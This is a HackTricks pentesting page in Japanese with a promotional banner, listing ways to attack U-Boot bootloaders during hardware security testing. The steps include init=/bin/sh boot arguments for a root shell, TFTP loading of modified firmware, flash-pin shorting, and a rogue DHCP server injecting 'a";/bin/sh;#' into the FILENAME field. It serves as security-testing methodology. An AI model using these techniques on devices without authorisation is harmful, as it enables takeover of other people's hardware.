<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ会社**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！

- 独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションである[**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見してください。

- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。

- [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローしてください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。

</details>


[https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)からコピー

デバイスの起動とU-bootなどのブートローダーを変更する場合、次のことを試してみてください：

* ブート中に「0」、スペース、または他の特定の「マジックコード」を押してブートローダーのインタプリタシェルにアクセスしようとする。
* 設定を変更して、ブート引数の末尾に「`init=/bin/sh`」などのシェルコマンドを実行する。
* `#printenv`
* `#setenv bootargs=console=ttyS0,115200 mem=63M root=/dev/mtdblock3 mtdparts=sflash:<partitiionInfo> rootfstype=<fstype> hasEeprom=0 5srst=0 init=/bin/sh`
* `#saveenv`
* `#boot`
* ワークステーションからネットワーク経由でイメージをロードするためのtftpサーバーをセットアップします。デバイスがネットワークアクセスできることを確認してください。
* `#setenv ipaddr 192.168.2.2 #デバイスのローカルIP`
* `#setenv serverip 192.168.2.1 #tftpサーバーのIP`
* `#saveenv`
* `#reset`
* `#ping 192.168.2.1 #ネットワークアクセスが利用可能かどうかを確認する`
* `#tftp ${loadaddr} uImage-3.6.35 #loadaddrは2つの引数を取ります：ファイルをロードするアドレスとTFTPサーバー上のイメージのファイル名`
* `ubootwrite.py`を使用してubootイメージを書き込み、ルート権限を取得するために変更されたファームウェアをプッシュします。
* 次のような有効なデバッグ機能をチェックします：
* 冗長なログ記録
* 任意のカーネルのロード
* 信頼できないソースからのブート
* \*注意して使用してください：1つのピンをグラウンドに接続し、デバイスのブートアップシーケンスを監視し、カーネルが展開される前に、グラウンドされたピンをSPIフラッシュチップのデータピン（DO）にショート/接続します。
* \*注意して使用してください：1つのピンをグラウンドに接続し、デバイスのブートアップシーケンスを監視し、カーネルが展開される前に、グラウンドされたピンをNANDフラッシュチップのピン8と9にショート/接続します。この時点でU-bootがUBIイメージを展開します。
* \*ピンのショート前にNANDフラッシュチップのデータシートを確認してください。
* 悪意のあるパラメータを持つローグDHCPサーバーを設定し、デバイスがPXEブート中に入力するようにします。
* Metasploit（MSF）のDHCP補助サーバーを使用し、`‘a";/bin/sh;#’`のようなコマンドインジェクションコマンドで「`FILENAME`」パラメータを変更して、デバイスの起動手順の入力検証をテストします。

\*ハードウェアセキュリティテスト
